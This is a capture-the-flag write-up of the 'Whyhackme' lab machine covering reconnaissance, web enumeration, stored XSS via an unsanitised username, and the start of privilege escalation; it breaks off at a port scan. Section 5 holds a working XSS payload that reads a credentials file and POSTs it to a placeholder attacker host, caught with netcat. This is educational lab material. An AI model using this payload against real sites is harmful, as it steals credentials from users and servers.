# TItle: Whyhackme

**Difficulty**: Medium

**Category**: Red

## 1. Reconnaissance

I start with by launching a simple nmap scan just to discover which ports are open.

```bash
nmap 10.48.167.14
```

![alt text](photos/1nmap.png)


I ran another nmap scan but this time with -sV and -sC tag to check which versions of services are running and if FTP allows anonymous login
```bash
nmap -sV -sC 10.48.167.14
```
![alt text](photos/2nmap.png)
![alt text](photos/3nmap.png)

FTP indeed allows anonymous login, we also discovered theres an update.txt in their ftp server

![alt text](photos/ftp.png)

let us download it incase there might be something interesting inside.

```bash
wget ftp://anonymous:anonymous@10.48.172.51/update.txt
```

The file mentions that an existing account 'mike' was removed and a directory dir/pass.txt exists where credentials are stored.

![alt text](photos/update.png)

## 2. Exploring the web 

When opening the website, we are then greeted with blog page and when exploring we discover that the website has a comment section but we are required to be logged in. This suggest that we might be able to execute some XSS attacks. Also it also mentioned that an admin user exists so we'll keep that in mind

![alt text](photos/web1.png)

![alt text](photos/login.png)

I also tried accessing the dir/pass.txt directory and as expected, We are prohibited to access it.

![alt text](photos/403.png)

I then opened to burpsuite to see if we can access it by changing our origin IP from 127.0.0.1.

![alt text](photos/4033.png)

No luck, tried a ton of headers like X-Remote-IP: 127.0.0.1, X-Forwarded-For: 127.0.0.1, Client-IP: 127.0.0.1 nothing worked.

## 3. Enumerating

I ran fuzzing attacks against the website using gobuster to reveal hidden pages on the website.

```bash
gobuster dir -w wordlist.txt -u http://10.49.170.1/ -x php
```

While scanning we were able to discover multiple interesting pages

![alt text](photos/fuzzing.png)

Some interesting pages

config.php
register.php
logout.php

By visiting config.php we are greeted with a blank page. But in register.php we are allowed to create an account in the website, maybe by creating an account we can then comment in the blog post.

## 4. Foothold

I've successfully logged in and I am now allowed to leave a comment to the blog post, let us try commenting a basic XSS payload to check if the web is vulnerable to xss.

![alt text](photos/logged.png)

```bash
<script> alert(1)</script>
```

Unfortunately the website sanitizes the comment section. but it also shows that our username is also reflected in the html body. 

![alt text](photos/comment.png)
![alt text](photos/inspect.png)

Let us try using the XSS Payload as our username instead of commenting it, Maybe usernames are not sanitized.

Username is indeed not sanitized.
![alt text](photos/reflected.png)

## 5. Exploitation

To make it easy for ourselves, let look for an existing XSS payload that would help us fetch the contents of the dir/pass.txt

```bash
<script>fetch("http://127.0.0.1/dir/pass.txt").then(x => x.text()).then(y => fetch("http://<ATTACKER_IP>:<ATTACKER_PORT>", {method: "POST", body:y}));</script>
```

Lets use this payload that I found on the internet, Just replace the Attacker IP to your tun0 IP and change the Attacker Port to the port you are listening to.

Let us also ready our netcat

```bash
nc -lnvp 9999
```

Now lets create another account using the payload as our username and leave a comment to execute the payload.

![alt text](photos/create.png)
![alt text](photos/leave.png)

After leaving the comment and refreshing the web. We were able to retrieve the contents of the pass.txt from our netcat, giving us a user and password which then we can use to SSH to the targets server.

![alt text](photos/pass.png)


## 6. Priviledge Escalation

We are now able to get into their server using jack's account.

![alt text](photos/ssh.png)

Let us first look for the user.txt flag using

```bash
find | grep user.txt
```

![alt text](photos/user.png)

Whats left is the root.txt which we are only able to access with root priviledge. I ran sudo -l to check available SUID the user jack can use.

After checking, we can run iptables as root. I've looked up in gtfobins if we can use any priviledge escalation techniques using iptables unfortunately there isnt.

![alt text](photos/suid.png)

While exploring the server I discovered 2 interesting files in opt. urgent.txt and a pcap file. Inside the urgent.txt it is mentioned that there has been a previous infiltration that occured. Suggesting that inside cgi-bin there might be a backdoor/rootkit stored in that directory.

![alt text](photos/urgent.png)

I tried accessing the cgi-bin and no luck, I also checked the permissions of the cgi-bin and it states that the directory is owned by the user "h4cked". Probably the reason why the admin could not delete it.

![alt text](photos/cgi.png)

Let's download the file using scp and open it with wireshark.

```bash
scp  jack@10.48.184.243:/opt/capture.pcap /home/myname/Documents/ctf/Whyhackme
```

When inspecting the pcap file, Everything is incomprehensible since the traffic is encrypted. The only clue we have is that the attacker is attacking the server via port 41312.

![alt text](photos/port.png)

I went back to the machine and check what ports are currently open.

```bash
ss -tlnp
```

and surprisingly port 41312 is still open suggesting that a service is currently running

![alt text](photos/ss.png)

I ran an nmap scan on the malicious port to see what service is currently running.

```bash
nmap -sV -p 41312 (target-ip)
```